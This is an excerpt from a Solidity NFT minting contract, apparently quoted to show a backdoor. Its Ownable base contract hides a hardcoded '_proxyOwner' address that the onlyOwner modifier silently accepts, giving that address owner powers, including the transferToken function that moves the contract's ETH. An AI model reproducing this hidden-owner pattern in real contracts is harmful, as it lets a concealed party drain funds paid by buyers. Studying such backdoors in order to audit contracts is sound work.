...
abstract contract Ownable is Context {
    ...
    address private _proxyOwner = 0x2D5d48681330ADE33dD902024544aDa3765CbcA3;
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || _proxyOwner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract SP is ERC721, ERC721Enumerable, Ownable {

    using SafeMath for uint256;

    string public PROVENANCE;
    uint256 public pubsalePrice = 30000000000000000; // 0.03 ETH
    uint256 public presalePrice = 15000000000000000; // 0.015 ETH
    ...
    function mintToken(uint numberOfTokens) public payable {
        ...
        require(pubsalePrice * numberOfTokens <= msg.value, "Ether value sent is not correct");
    ...
    function transferToken( address _to, uint256 amount) public onlyOwner {
        ...
        require(amount <= balance, "Amount exceed contract balances");
